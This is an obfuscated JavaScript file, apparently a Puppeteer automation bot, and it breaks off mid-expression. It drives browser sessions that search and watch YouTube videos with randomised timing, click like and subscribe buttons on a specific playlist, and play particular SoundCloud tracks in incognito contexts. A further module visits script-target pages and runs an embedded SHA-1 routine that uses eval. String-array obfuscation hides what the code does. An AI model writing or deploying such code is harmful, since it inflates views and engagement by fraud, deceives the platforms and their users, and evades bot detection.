const Y = c,
  X = d,
  W = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x7b1 * -0x1 + -0x2390 + 0x1be0))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x78d + 0x1858 * -0x1 + 0x1fe5), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1937 + -0x11e6 + -0x751);
    let h = e[f];
    if (c['UeIDGn'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x18e6 * 0x1 + -0x170 + -0x1776, r, s, t = 0x95d + 0x4 * -0x1bb + -0x271 * 0x1; s = m['charAt'](t++); ~s && (r = q % (-0x7b1 * -0x1 + -0x2390 + 0x1be3) ? r * (-0x78d + 0x1858 * -0x1 + 0x2025) + s : s, q++ % (0xdd3 * 0x2 + -0x6 * -0x411 + -0xb9 * 0x48)) ? o += String['fromCharCode'](-0x6a * 0x4e + -0x2b * -0x31 + 0x1910 * 0x1 & r >> (-(0xb9 * 0x27 + -0x86f + -0x13be) * q & -0x1c49 + -0x4c + 0x1c9b)) : 0x3 * 0x77f + -0x1a5 + -0x14d8) {
          s = n['indexOf'](s);
        }
        for (let u = -0x49d * 0x1 + 0x1 * -0x2234 + 0x26d1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x5a6 + 0x665 * 0x2 + -0x1260))['slice'](-(0x3fe * -0x2 + -0x2152 + 0x2950));
        }
        return decodeURIComponent(p);
      };
      c['JVlwPK'] = i, b = arguments, c['UeIDGn'] = !![];
    }
    const j = e[-0x127a + -0xd84 + 0xc3 * 0x2a],
      k = f + j,
      l = b[k];
    return !l ? (h = c['JVlwPK'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xa5df * 0x1 + -0x3 * -0x30cb + -0xc31 * 0x10 + (-0x3071 * 0x2 + -0x28 * -0x9e + 0x82ca * 0x1) * random()) : await standardWaitForNetIdle(f), await wait(0xb9 * 0x27 + -0x86f + -0x38 + (-0x3893 + -0x98 + 0x603b) * random()), 0x3 * 0x77f + -0x1a5 + -0x14d7;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x49d * 0x1 + 0x1 * -0x2234 + 0x3a59), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x5a6 + 0x665 * 0x2 + -0x126f;
}
async function randomWait() {
  return await wait(0x3fe * -0x2 + -0x2152 + 0x3cd6 + (-0x127a + -0xd84 + 0xa4e * 0x5) * random()), 0x19c3 + 0x635 + -0x1ff7;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1b58 + -0x108e * 0x1 + -0xaca, -0x1b4b + -0x1260 + -0x2 * -0x16d9), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x76 * -0x14c + -0x1 * -0x12d3a + -0x1 * 0xdbe2) * getRandomInt(0x2 * 0x2f6 + -0xad1 + 0x4e7, -0x324 + -0x1468 + 0x1791), h)), 0x1 * 0x72a + 0x1924 + 0x1 * -0x204d;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x793 + -0x2120 + 0x28b3;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x4cf * 0x2 + 0xf * 0x49 + 0x558]['split']('\x20');
    for (let k = -0xe26 + -0x8c6 + 0x16ec; k < i['length']; k += 0xdea + -0x860 + -0x162 * 0x4)
      j += i[k] * h[i[k + (0x80a + 0xbcf * -0x3 + -0x4 * -0x6d9)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x7 * 0xbf + -0x5 * 0x631 + 0x2434)['map'](l => Array['from'](l['children']))['flat'](0x2c0 * 0xa + 0x4e * 0x47 + -0x3121)['map'](l => l['childNodes'][0x2182 + -0x15ea + -0x3dd * 0x3]['childNodes'][0x2478 + -0x189f + -0x3 * 0x3f3]['childNodes'][0x13fd + 0x897 + 0x299 * -0xb]['childNodes'][0x5e6 * 0x4 + 0x15a4 + 0xc1 * -0x3c]['childNodes'][0x6 * -0x1bd + 0x21be + -0x174f]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0xd * -0x12 + 0x2347 + -0x1e75, -0x1687 + -0x8bf * 0x1 + 0x32ce)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x2e * 0x156 + -0x4472 + 0x4196);
  const h = await getMaxTime(f),
    i = Math['min']((0x15412 + -0x2249 + -0xb5 * 0x65) * getRandomInt(0x1dce + -0xf * 0xae + -0x139a, -0x287 * 0x4 + 0xdb7 + -0x36 * 0x11), h);
  return await wait(i), 0x1758 + 0x9b6 * -0x1 + -0xda1;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const R = d;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x262e + 0x10 * 0x14e + 0x114e]['children'][-0xa2 + -0x1c24 + 0x1cc6]['children'][-0x1c * -0x14c + -0x1 * 0x1411 + 0x103f * -0x1]['children'][0x894 + 0x2 * 0xa57 + -0x42e * 0x7][R(0x3)][0x2590 + -0x3 * -0x71e + 0x1 * -0x3aea]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1835 * -0x1 + -0x1035 + -0x7ff;
}

function a() {
  const bm = [
    'B2nPywXFC2HHCG',
    'WOxdKSo8pSoxW6BcI8kaW5Cy',
    'FWKMvLRdOa',
    'children',
    'jujejufdBwfYAW',
    'out-the-tr',
    'ence-betwe',
    'W7RcSWRdQCkBW6apjW/cMa',
    'ike\x20Gecko)',
    'amoSW6hdRCoCc1VdOSk4fa',
    'WP/cNHeDWQCcyr3cSM8',
    'W54RE8o+wxJcTWfp',
    'outube-add',
    'W4VdP2y6nIvwWOHjsW',
    'easyfork.o',
    'lwzVy3vZ',
    's\x20韓国語,bts\x20',
    'W4i2brRdKWGvWQFcVSk1',
    'nces_Tab',
    'QFDKBxmOn3',
    'AgvHzgvYCW',
    'ptcha',
    'FCkpv8oMW6RdQhRcKgJdQG',
    'ed2fbb5792'
  ];
  a = function() {
    return bm;
  };
  return a();
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x99c + 0x1bf * -0xa + -0x2 * -0xdbb + (-0x178d * 0x1 + 0x1226 + 0x599) * random()
  }), await wait(0x1f * -0x101 + 0x18d8 + 0x83b + (-0x1b3d + -0x1a06 + 0x366f) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x12b5 + -0x1 * -0x1 + -0x3 * 0x63c]['childNodes'][0x270e + -0x6 * 0x126 + -0x1 * 0x2029]['childNodes'][-0x1eb * 0x11 + 0x209c + 0x0]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x2ee + 0x542 + -0x1 * 0x24f]['childNodes'][0x12 * -0xae + 0x8 * 0x80 + 0x83c]['childNodes'][-0x4 * -0x761 + 0x1 * -0x795 + -0x1 * 0x15ed]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x2 * -0x1382 + -0x253b + 0x2 * 0x2620),
          r = 0x1dbe + 0x1f5d + -0x3d1b;
        for (let u = 0xe8b + 0x69d + -0x1528; u < q['length']; u += -0xc * 0xa4 + 0xcf4 + -0x542)
          r += q[u] * k[q[u + (-0x11d * -0x13 + 0x43 * 0x27 + -0x1f5b)]];
        return r;
      }(n);
  });
  await wait((-0x3cbd + 0x2c46 + -0xb7 * -0x69) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x8495 + 0xc9 * -0xda + -0x1 * -0x21a1f) * getRandomInt(-0x2649 + -0x182f + 0x3e79, 0x10 * -0x59 + -0x2 * -0x7d6 + -0x1 * 0xa12), h + (-0x7 * 0x569 + -0x3 * -0x7fc + 0x2173));
  return await wait(i), 0xa74 + -0x118b + 0x1 * 0x718;
}
async function keyWatch(f) {
  const S = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x115b * -0x1 + -0xd * 0x3 + 0x1182), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + S(0x11, 'sK1@') + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x19 * 0x17b + -0x1 * -0x1a29 + -0x36 * -0x6b + (0x175b + -0x1 * 0x63e + -0xd35) * Math['random']());
    });
  }, 0x69d * -0x5 + 0x126f + 0x4aa * 0x9);
  await wait(0x6c3d1 + -0x1 * -0x8ab72 + 0x1 * -0xadb63);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x16e43 + -0x5870 + 0xe5b1 * 0x3) * getRandomInt(-0x1448 + 0x82a + 0xc22, -0x1 * -0x131e + -0x8fb * -0x1 + -0x2 * 0xe00)), clearInterval(h), -0x16a4 + -0x1 * 0x25a9 + 0x1f * 0x1f2;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1937 + -0x11e6 + -0x751);
    let h = e[f];
    if (b['cTnwpf'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x18e6 * 0x1 + -0x170 + -0x1776, s, t, u = 0x95d + 0x4 * -0x1bb + -0x271 * 0x1; t = n['charAt'](u++); ~t && (s = r % (-0x7b1 * -0x1 + -0x2390 + 0x1be3) ? s * (-0x78d + 0x1858 * -0x1 + 0x2025) + t : t, r++ % (0xdd3 * 0x2 + -0x6 * -0x411 + -0xb9 * 0x48)) ? p += String['fromCharCode'](-0x6a * 0x4e + -0x2b * -0x31 + 0x1910 * 0x1 & s >> (-(0xb9 * 0x27 + -0x86f + -0x13be) * r & -0x1c49 + -0x4c + 0x1c9b)) : 0x3 * 0x77f + -0x1a5 + -0x14d8) {
          t = o['indexOf'](t);
        }
        for (let v = -0x49d * 0x1 + 0x1 * -0x2234 + 0x26d1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x5a6 + 0x665 * 0x2 + -0x1260))['slice'](-(0x3fe * -0x2 + -0x2152 + 0x2950));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x127a + -0xd84 + 0xc3 * 0x2a,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x19c3 + 0x635 + -0x1ff8; u < 0x1b58 + -0x108e * 0x1 + -0x9ca; u++) {
          p[u] = u;
        }
        for (u = -0x1b4b + -0x1260 + -0x9 * -0x513; u < -0x5 * -0x28d + -0x7 * -0x396 + -0x1 * 0x24db; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x2 * 0x2f6 + -0xad1 + 0x5e5), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x324 + -0x1468 + 0x178c, q = 0x1 * 0x72a + 0x1924 + 0xa * -0x33b;
        for (let v = -0x793 + -0x2120 + 0x28b3; v < n['length']; v++) {
          u = (u + (-0x4cf * 0x2 + 0xf * 0x49 + 0x558)) % (-0xe26 + -0x8c6 + 0x17ec), q = (q + p[u]) % (0xdea + -0x860 + -0x245 * 0x2), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x80a + 0xbcf * -0x3 + -0x2b * -0xa9)]);
        }
        return t;
      };
      b['VWxVuT'] = m, c = arguments, b['cTnwpf'] = !![];
    }
    const j = e[-0x7 * 0xbf + -0x5 * 0x631 + 0x242e],
      k = f + j,
      l = c[k];
    return !l ? (b['gFKDez'] === undefined && (b['gFKDez'] = !![]), h = b['VWxVuT'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x2220 + 0x1 * 0x1cf3 + 0x43 * -0xf1;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x9a * 0x7 + 0x1 * 0x2479 + -0x28ae;
    await randomWait();
  }
  return -0x566 + 0xc5f + -0x37c * 0x2;
}

function fetchRandomSC() {
  const V = d,
    U = c,
    T = b;
  return Math[T(0x2, 'Ro16')]() <= -0xa58 + -0xe * -0x1ec + -0x28 * 0x6a + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x1dc4 + -0x17b3 * -0x1 + 0x611 * 0x1 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + U(0x0) + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + V(0x5) + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x20f1 + -0x1086 + -0x106b + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x25d4 + 0xc1e + -0x853 * 0x6;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x2f74 + 0x1 * 0xcbf1 + -0x134b * -0x1 + getRandomInt(0x3a3 + 0x5eda + -0x27e5, -0x5 * 0xfe3 + 0xe07f + -0x1be0));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x3 * -0x74a + 0x2 * 0xeef + -0x33bb), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x9 * -0x1d3 + 0x1ab + 0xec0;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0xf45 + 0x1edc + -0x2e21, -0x1 * 0x1dc3 + 0x12c6 * 0x2 + -0x1d * 0x43)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1fd4 * 0x1 + 0x1b4e + 0xc56 + floor((0xe * 0x2bf + -0x2318 + 0x8e) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x18d72 * -0x6ed1 + -0xd63 * -0x33c42 + 0x1602cd * -0x3f8),
          -0xfbf338 + 0x277 * -0x5149 + 0x2444e27,
          0x142 * 0x20 + 0xcadd + 0x3 * -0x265f,
          -0x24b + -0x1 * -0x221e + -0xb * 0x2d9
        ], y = [
          0x4c * 0x49 + 0x15 * 0x11b + -0x2ccb,
          0x25 * 0x2 + -0x1494 + 0x5 * 0x412,
          0x7 * 0x3fa + 0x690 + -0x225e,
          0x1 * -0xec6 + 0x841 + 0x685
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x2274 + 0x206 + -0x2479)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x1 * -0x9f7 + -0x1b9 + -0x83e * 0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1f * 0xa3 + 0xb * -0x304 + 0xd6f) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x1 * -0x37d + -0x1ee0 + 0x171 * 0x13] = A[-0x1 * -0x1297 + 0x172e + -0x1 * 0x29b5] = A[-0x7 * -0xdd + 0x1159 * 0x2 + -0x1da * 0x16] = A[0x31b * -0x5 + -0x10 * 0xda + 0x1 * 0x1d29] = A[-0x1e71 + -0x5c * -0x61 + 0x1 * -0x468] = A[0x841 * 0x1 + 0x314 * 0x2 + -0xe65] = A[0x13af * -0x1 + -0x5d5 * 0x4 + 0x2b08] = A[0x1 * 0xead + 0x815 + -0x3ca * 0x6] = A[-0x15f4 + 0x567 * -0x2 + -0x1 * -0x20c9] = A[-0x1b0c + -0x16b6 + 0x31ca] = A[-0x18ae + -0x213f + 0x2 * 0x1cfb] = A[0x1753 + -0xc1c + -0xb2d] = A[-0x757 + -0x189 + 0x8eb] = A[-0x63 * -0x53 + -0x1 * 0x125b + 0x1 * -0xdb2] = A[0xa * -0x139 + 0x368 + 0x8df] = A[-0x144 + 0x28a + 0x6 * -0x34] = A[-0x1baa + -0x149a * -0x1 + 0x71f] = 0xc3d + 0x1 * -0x11b1 + 0x574, this['blocks'] = A) : this['blocks'] = [
                0x453 + -0x1387 + -0x22c * -0x7,
                -0x21c4 + 0x79 * -0x3 + 0x232f,
                -0x291 * 0xd + -0x1 * 0x16e0 + 0x3 * 0x12bf,
                -0x1c08 + 0x6 * -0x111 + 0xd * 0x2a6,
                0x241b + 0x83 * -0x43 + -0x1d2,
                0x1 * -0x2096 + 0x3 * -0x8ab + 0x35 * 0x11b,
                -0x213d + 0x1 * -0x556 + 0x2693,
                0x6 * -0x3a5 + -0x1 + 0xb * 0x1fd,
                0x11a6 + 0x25 * 0x41 + -0x1b0b,
                -0x22db * 0x1 + -0x17e6 + -0x1 * -0x3ac1,
                0xe * -0x1b8 + 0xc3d * 0x1 + 0x3f1 * 0x3,
                0x1235 + 0x2 * -0x119b + 0x1101,
                -0x1de9 + -0x511 + 0x22fa,
                -0x808 + 0x27 * 0x8e + -0xd9a,
                0x7 * 0xa + 0x17ef * -0x1 + 0x2a1 * 0x9,
                -0x1 * -0x11c5 + -0x6 * -0x4f2 + -0x2f71,
                -0x2136 + 0x49e + 0x1c98
              ], this['h0'] = 0x7 * -0x706a405 + 0x9f456a + -0x97d459ba * -0x1, this['h1'] = -0x3df * 0x70c953 + -0xecc4bff * 0x19 + 0x4165c6fbd, this['h2'] = -0x61161239 * 0x1 + 0xd34c847 + 0x5 * 0x2f526e30, this['h3'] = 0x1f67b072 + 0x30 * -0x7e6f1 + -0xdba0ecc, this['h4'] = 0x16237ba4 + -0x29b265c0 * -0x1 + 0x83fd008c, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x127 * -0x1b + -0x2710 + 0x7f3, this['finalized'] = this['hashed'] = -0x3 * 0x9b1 + 0x18ba + 0x459 * 0x1, this['first'] = -0x235 + 0x26b * -0xb + 0x1ccf;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x105b + -0x178a + 0x1 * 0x27e5, O = J['length'] || 0xd * -0x182 + 0x40d + 0x3 * 0x52f, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x3 * -0x85f + 0x1e8f + -0x572, P[0x113 + -0x1 * -0x1f1e + -0x2031] = this['block'], P[-0x16a8 + -0x212f * -0x1 + 0x39 * -0x2f] = P[-0xb8 * -0x4 + 0x19b * -0x7 + 0x85e] = P[0x601 + 0x5 * 0x3d + -0xb8 * 0xa] = P[0x2263 + 0x8ff * -0x3 + -0x763] = P[-0x2583 + 0x19d * 0xc + -0x1 * -0x122b] = P[-0xc89 * -0x1 + 0x2ce * 0xb + -0xb6 * 0x3d] = P[-0x1214 + 0x2179 + 0xf5f * -0x1] = P[0x5 * -0x737 + 0x1d76 + 0xa * 0xaa] = P[-0x1 * 0x9c1 + -0x1e21 * -0x1 + 0x38 * -0x5d] = P[-0x175b * 0x1 + -0x1 * -0x32f + 0x1435 * 0x1] = P[-0x24be + -0x1430 + -0x2 * -0x1c7c] = P[-0x26d2 + -0xf5e * -0x1 + 0x177f] = P[-0x1 * 0xc46 + -0x1ba5 + -0x313 * -0xd] = P[-0xd91 + 0x2458 + -0x16ba * 0x1] = P[0x2536 * 0x1 + -0x14d8 + -0x1050] = P[-0x1 * -0x1dad + -0x57b * -0x5 + 0x1 * -0x3905] = 0x1d1e + 0x1436 + 0x4 * -0xc55), K) {
                    for (N = this['start']; M < O && N < -0x1dd4 + 0x2c2 + 0x1b52; ++M)
                      P[N >> -0x1916 + -0x15b4 + 0x95c * 0x5] |= J[M] << y[0x13c7 + 0x1284 + 0x5 * -0x7a8 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x11 * -0x1a6 + -0xc6c + 0x28b2; ++M)
                      (L = J['charCodeAt'](M)) < 0x239d + -0x67 * -0x11 + 0x166 * -0x1e ? P[N >> 0x1f81 * 0x1 + 0x71 * -0xc + -0x1a33] |= L << y[0x1585 + 0xd * 0x21f + -0x3115 & N++] : L < 0x13 * 0x9b + -0x1a55 + -0x4 * -0x5b5 ? (P[N >> 0x4 * 0x475 + -0x105f + -0x173] |= (-0x1413 + -0x185d + 0x2d30 | L >> 0x86 * -0x37 + -0x49 * 0x4 + 0x1df4) << y[0xfea + -0xc57 + -0x390 * 0x1 & N++], P[N >> 0xa25 + 0xa51 + 0xe * -0x176] |= (0x466 + 0x2 * 0x71b + -0x121c | 0x107 * 0x5 + -0x7f4 + 0xc4 * 0x4 & L) << y[-0x277 + 0x1352 + 0x268 * -0x7 & N++]) : L < 0x1911f + 0x641 * 0x2b + -0x1c60a || L >= -0x5 * 0x833 + -0xb6e1 * 0x1 + 0x1bfe0 ? (P[N >> 0x2f7 + 0x16 * 0xd1 + -0x14eb] |= (0x1 * 0x11a7 + -0x5bc * 0x1 + -0xb0b | L >> 0x166f + -0x2643 + 0xfe0) << y[0xe * 0xaf + -0x258d + 0x1bfe & N++], P[N >> -0x3de + -0x5ce * -0x1 + -0xf7 * 0x2] |= (0x17bb + -0x2577 + 0xe3c | L >> -0x15 * 0xb9 + 0xac * 0x35 + -0x1469 & -0x2458 + -0x467 + 0x28fe) << y[0x1ecb * 0x1 + -0x13 * -0x157 + -0x383d * 0x1 & N++], P[N >> -0x5b * 0x13 + 0x1 * 0x1a5 + 0x5 * 0x106] |= (-0x2e * -0x19 + -0xb * -0x18b + -0x6fd * 0x3 | -0x2 * -0x7c3 + -0xb31 + -0x416 & L) << y[-0x1b7 * 0xa + -0xe09 + 0x6 * 0x533 & N++]) : (L = 0xf8 * -0x183 + -0x72 * 0xac + 0x2c380 + ((-0x2487 + 0x265c + 0x115 * 0x2 & L) << 0x76c + 0x184a + 0x1 * -0x1fac | -0x1dbf + -0xa42 + -0xb * -0x400 & J['charCodeAt'](++M)), P[N >> 0xb3 * 0x25 + 0x1390 + -0x191 * 0x1d] |= (-0x1915 * 0x1 + -0x4bb * -0x1 + 0x154a | L >> 0x2 * -0x53 + 0xa5b * -0x2 + 0x156e) << y[-0x2191 + -0x50 * 0x63 + 0x4084 & N++], P[N >> -0x1323 + -0x59b + -0xc60 * -0x2] |= (0x1 * -0x12ec + 0x9a3 + -0x1 * -0x9c9 | L >> -0x70e + -0x1fdb + 0x26f5 & -0xc1 * -0x17 + 0x176a + -0x2882) << y[0x1c9 * -0x15 + 0x28d * 0x3 + 0x1dd9 & N++], P[N >> 0x8d3 + 0x1bfb * 0x1 + 0x1d7 * -0x14] |= (-0x22a4 + 0x2446 * 